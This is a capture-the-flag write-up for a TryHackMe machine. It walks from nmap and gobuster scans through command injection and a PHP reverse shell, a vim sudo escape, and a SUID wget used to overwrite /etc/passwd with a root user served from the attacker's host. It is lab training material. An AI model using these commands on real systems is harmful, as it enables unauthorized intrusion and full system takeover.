---
title: MNS CORP - TryHackMe
author: Vishnu Sudhakaran
date: 2022-02-15 21:00:00 +0530
categories: [Boot2Root, TryHackMe]
tags: [ easy, rce, privesc, linux, gtfobin ]
published: false
---

![](/assets/img/posts/mns/1.png)

An Awes0me Beginner friendly CTF challenge created by my friend [MANASRAMESH4](https://twitter.com/MANASRAMESH4), Let's exploit the machine.

Room : [https://tryhackme.com/room/mnsctf1initcrew](https://tryhackme.com/room/mnsctf1initcrew)

Author : [@jacksparrow1998](https://tryhackme.com/p/jacksparrow1998)

## Reconnaissance:

We can start with `nmap` scan.

```bash
➜ nmap -sC -sV 10.10.209.251 --min-rate 1000                               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 21:41 IST
Nmap scan report for 10.10.209.251
Host is up (0.40s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bf:ac:06:d3:3c:07:30:2a:32:e1:02:17:14:93:71:2a (RSA)
|   256 36:9c:6d:6b:0f:4f:61:05:6d:05:5b:63:7b:2b:1f:20 (ECDSA)
|_  256 02:a1:81:ab:6b:82:f9:98:53:ba:26:e8:7e:f2:42:d9 (ED25519)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Eventoz : Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
21111/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9b:e4:63:77:4e:3a:aa:11:c1:fa:56:c9:b5:4c:b4:68 (RSA)
|   256 0f:28:ff:b0:bd:8a:0e:6f:24:6d:04:bb:08:5b:b1:74 (ECDSA)
|_  256 34:88:5f:80:32:31:ab:71:67:c0:5e:9f:21:68:12:4f (ED25519)
21234/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.17.0.2 is not the same as 10.10.209.251
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.29.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.08 seconds

```

There is a webserver running on port 80, let's have a look.

![](/assets/img/posts/mns/2.png)

It's just a nicely themed dummy web page. While crawling through the webpage `gobuster` gives an interesting `/compliants.php` file.

```bash
➜  gobuster dir -u http://10.10.209.251/ -w /usr/share/wordlists/dirb/common.txt -x php,js    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.209.251/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js
[+] Timeout:                 10s
===============================================================
2022/02/13 22:19:51 Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.js              (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.209.251/assets/]
/complaints.php       (Status: 200) [Size: 1017]                                  
/index.html           (Status: 200) [Size: 37811]                                 
/mailer.php           (Status: 403) [Size: 59]                                    
/server-status        (Status: 403) [Size: 278]                                   
                                                                                  
===============================================================
2022/02/13 22:29:48 Finished
===============================================================
```

![](/assets/img/posts/mns/3.png)

When we give some inputs and submit the data, we can see some parameters on the url.

![](/assets/img/posts/mns/4.png)

And the interesting part here `/action_page.php?fname=` url parameter is vulnerable for Command Injection.

![](/assets/img/posts/mns/5.png)

## Gaining foothold:

I have tried to get a direct reverse shell connection by giving reverse shell commands nc,python,php but it all has failed :(

So i uploaded a [php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell via `wget` command.

![](/assets/img/posts/mns/6.png)

Set a listener and call it.

![](/assets/img/posts/mns/7.png)

We have successfully get the reverse shell as `www-data`. Let's check for sudo privilege by running `sudo -l` command.

```bash
➜  nc -lnvp 1335
listening on [any] 1335 ...
connect to [10.4.29.202] from (UNKNOWN) [10.10.209.251] 46108
Linux 0717c3460eb4 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 23:43:13 up  2:09,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
$ sudo -l
Matching Defaults entries for www-data on 0717c3460eb4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on 0717c3460eb4:
    (john) NOPASSWD: /bin/vim
$ 


```

## Privilege Escalation:

Here we can [exploit](https://gtfobins.github.io/gtfobins/vim/) that `vim` binary to get `john` user.

```bash
$ sudo -l
Matching Defaults entries for www-data on 0717c3460eb4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on 0717c3460eb4:
    (john) NOPASSWD: /bin/vim

$ sudo -u john /bin/vim -c ':!/bin/sh'

:!/bin/sh
whoami
john
id
uid=1000(john) gid=1000(john) groups=1000(john),33(www-data)

```

Let's get interactive TTY shell using `python`.

```bash
which python
/usr/bin/python3

python3 -c 'import pty; pty.spawn("/bin/bash")'

Low_Priv Shell $:
```

We will get our first flag on `/home/john/flag_1.txt`
```bash
Low_Priv Shell $:cat flag_1.txt
cat flag_1.txt
bfebba9e53{REDACTED}
Low_Priv Shell $:

```

When we check for sudo privilege for `john`, we will see there is an another user called `david`.

```bash
Low_Priv Shell $:sudo -l
sudo -l
Matching Defaults entries for john on 0717c3460eb4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on 0717c3460eb4:
    (david) NOPASSWD: /bin/grep

```

Also john's home directory we can see a suspicious `.l0g` file, when we read that file, we can see a `note.txt` in the david's home directory.

```bash
Low_Priv Shell $:ls -la
ls -la
total 52
drwxr-xr-x 1 john john 4096 Feb 13 23:53 .
drwxr-xr-x 1 root root 4096 May  5  2021 ..
-rw------- 1 john john  284 May  5  2021 .bash_history
-rw-r--r-- 1 john john  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 john john 3803 May  1  2021 .bashrc
drwx------ 2 john john 4096 May  1  2021 .cache
-rw-r--r-- 1 root root 1132 May  5  2021 .l0g
-rw-r--r-- 1 john john  807 Feb 25  2020 .profile
drwxr-xr-x 2 john john 4096 May  2  2021 .ssh
-rw------- 1 john john  559 Feb 13 23:53 .viminfo
-rw-r--r-- 1 root root   65 May  5  2021 flag_1.txt
Low_Priv Shell $:cat .l0g
cat .l0g
total 24
drwxr-xr-x 1 root  root  4096 May  5 02:09 .
drwxr-xr-x 1 root  root  4096 May  5 01:37 ..
drwx-----x 2 david david 4096 May  5 02:15 david
drwxr-xr-x 1 john  john  4096 May  5 02:17 john
david/:
total 32
drwx-----x 2 david david 4096 May  5 02:15 .
drwxr-xr-x 1 root  root  4096 May  5 02:09 ..
-rw------- 1 david david    5 May  5 02:13 .bash_history
-rw-r--r-- 1 david david  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 david david 3803 May  5 02:13 .bashrc
-rw-r--r-- 1 david david  807 Feb 25  2020 .profile
-rw-r--r-- 1 root  root   367 May  5 01:47 note.txt

john/:
total 52
drwxr-xr-x 1 john john 4096 May  5 02:17 .
drwxr-xr-x 1 root root 4096 May  5 02:09 ..
-rw------- 1 john john  201 May  5 02:11 .bash_history
-rw-r--r-- 1 john john  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 john john 3803 May  1 19:36 .bashrc
drwx------ 2 john john 4096 May  1 19:48 .cache
-rw-r--r-- 1 root root  197 May  5 02:17 .log.file
-rw-r--r-- 1 john john  807 Feb 25  2020 .profile
drwxr-xr-x 2 john john 4096 May  2 09:25 .ssh
-rw------- 1 john john  559 May  2 09:42 .viminfo
-rw-r--r-- 1 root root   65 May  5 01:39 flag_1.txt

```

It has a multiple encoded password string mentioned on `note.txt` that is `base64` and `rot13`, we can assume it will be the password for `david` user.

```bash
Low_Priv Shell $:cat /home/david/note.txt
cat /home/david/note.txt
My_Dairy 00:66:33:22:66
----------------------
Hey, I am david , Employee of CSS_Platent. I know I am good in security. AS this is my home floder which cannot acessed by a thirdparty, I can save my datas here. no one can see my datas.but still I will encrypt my datas for security

uname : davaid_look001919
mail : david911@cssplatent.com
pass : c3lianJlb25mcjEwMgo=

Low_Priv Shell $:echo 'c3lianJlb25mcjEwMgo=' | base64 -d
echo 'c3lianJlb25mcjEwMgo=' | base64 -d
sybjreonfr102

Low_Priv Shell $:su david
su david
Password: fl{REDACTED}

Mid_PrivShell $: id    
id
uid=1001(david) gid=1001(david) groups=1001(david)
Mid_PrivShell $: 

```

We have switch to the user `david`, Unfortunaltey we can't find 2nd flag on david's home directory, how ever when we read `.bash_history` file, we will find the path for the 2nd flag, another `note.txt` and a suspicious file called `odus`.

```bash
Mid_PrivShell $: cat .bash_history
cat .bash_history
exit
ls
cd /
find / -type f -perm -u=s 2>/dev/null
mv /home/david/.bin/8/0/1/9/4/0/wget /home/david/.bin/8/0/1/9/4/0/find_it_by_yourself
exit
sudo -l
ls
clear
ls
cp  /home/david/.bin/8/0/1/9/4/0/find_it_by_yourself  /tmp/wget
cp  /home/david/.bin/8/0/1/9/4/0/odus  /tmp/wget
exit

Mid_PrivShell $: cd .bin/8/0/1/9/4/0
cd .bin/8/0/1/9/4/0
Mid_PrivShell $: ls
ls
flag2.txt  note.txt  odus

Mid_PrivShell $: cat flag2.txt
cat flag2.txt
e647{REDACTED}

Mid_PrivShell $: cat note.txt
cat note.txt
So your reach the final stage...
so everything depends upon your way of thing and practical usage and logical thiking of varius applications to find this hidden app
I can only tell you one thing. If you can find this file, Your path is perfect. 
Go on
Few steps remaining

```

`odus` seems a interesting file and exact copy of `wget` binary and it also having SUID permission.

```bash
Mid_PrivShell $: ls -la
ls -la
total 552
drwxr-xr-x  2 root root   4096 May  5  2021 .
drwxr-xr-x 12 root root   4096 May  5  2021 ..
-rw-r--r--  1 root root     65 May  5  2021 flag2.txt
-rw-r--r--  1 root root    273 May  5  2021 note.txt
-rwsr-sr-x  1 root root 548568 Jul 25  2019 odus

Mid_PrivShell $: ./odus -h
./odus -h
GNU Wget 1.20.3, a non-interactive network retriever.
Usage: odus [OPTION]... [URL]...

Mandatory arguments to long options are mandatory for short options too.

Startup:
  -V,  --version                   display the version of Wget and exit
  -h,  --help                      print this help
  -b,  --background                go to background after startup
  -e,  --execute=COMMAND           execute a `.wgetrc'-style command

Logging and input file:
  -o,  --output-file=FILE          log messages to FILE
  -a,  --append-output=FILE        append messages to FILE
  -d,  --debug                     print lots of debugging information
  -q,  --quiet                     quiet (no output)
  -v,  --verbose                   be verbose (this is the default)
  -nv, --no-verbose                turn off verboseness, without being quiet
       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits
  -i,  --input-file=FILE           download URLs found in local or external FILE
  -F,  --force-html                treat input file as HTML
  -B,  --base=URL                  resolves HTML input-file links (-i -F)
                                     relative to URL
       --config=FILE               specify config file to use
       --no-config                 do not read any config file
       --rejected-log=FILE         log reasons for URL rejection to FILE

Download:...

```

## Root Privilege Escalation:

For getting root shell we can manipulate this binary by modifing `/etc/passwd` file. Let's exploit.
Check out an aw0some `wget` privilege escaltion [Article](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/) here. 

First look on target machine's `/etc/passwd` file and copy paste to our host machine, 

```bash
Mid_PrivShell $: cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
john:x:1000:1000::/home/john:/bin/bash
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
ftp:x:106:108:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
david:x:1001:1001::/home/david:/bin/bash

Mid_PrivShell $: 

```
In our host machine with help of `openssl` tool we are creating password for our new user called `anon`.

```bash
➜  openssl passwd -1 -salt anon anon
$1$anon$G05/IEkCfH5/MvkGBhHbe0

➜ 
```
After that we are adding our new user with root privilege to that `passwd` file at the bottom line.

```bash

➜  cat passwd                                                          
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
john:x:1000:1000::/home/john:/bin/bash
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
ftp:x:106:108:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
david:x:1001:1001::/home/david:/bin/bash
anon:$1$anon$G05/IEkCfH5/MvkGBhHbe0:0:0:root:/root:/bin/bash

➜  

```

Now run `python` HTTP server for transferring this file into target machine.

```bash
➜  python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.194.136 - - [14/Feb/2022 20:43:49] "GET /passwd HTTP/1.1" 200 -

```

```bash
Mid_PrivShell $: ./odus -O /etc/passwd http://10.4.29.202:8000/passwd
./odus -O /etc/passwd http://10.4.29.202:8000/passwd
--2022-02-14 20:43:50--  http://10.4.29.202:8000/passwd
Connecting to 10.4.29.202:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1457 (1.4K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd         100%[===================>]   1.42K  --.-KB/s    in 0.001s  

2022-02-14 20:43:50 (1.51 MB/s) - ‘/etc/passwd’ saved [1457/1457]

Mid_PrivShell $: 

```

BOOM!! Now we can switch to the user we created earlier with root privilege and you can root flag at `/root` directory. 

```bash
Mid_PrivShell $: su anon
su anon
Password: anon

 * Starting OpenBSD Secure Shell server sshd                             [ OK ] 
 * Starting FTP server vsftpd                                                   /usr/sbin/vsftpd already running.
                                                                         [ OK ]
 * Starting Apache httpd web server apache2                                      * 
[R00t_Shell] $: cd /root
cd /root
[R00t_Shell] $: ls
ls
r00t_fl4g.txt
[R00t_Shell] $: cat r00t_fl4g.txt
cat r00t_fl4g.txt
Congrats .. You compromised The Server!! 
This is your root flag

a08ba171{REDACTED}






Next Challenge will be released soon...stay tuned
share your suggestions to aXV1cXQ6Ly94eHgubWpvbGZlam8uZHBuL2pvL25ib2J0LXNibmZ0aS05YjdjYjQxNDkv
[R00t_Shell] $: whoami 
whoami
root

```

## Thank you for reading my writeup! Happy H4cking!!!
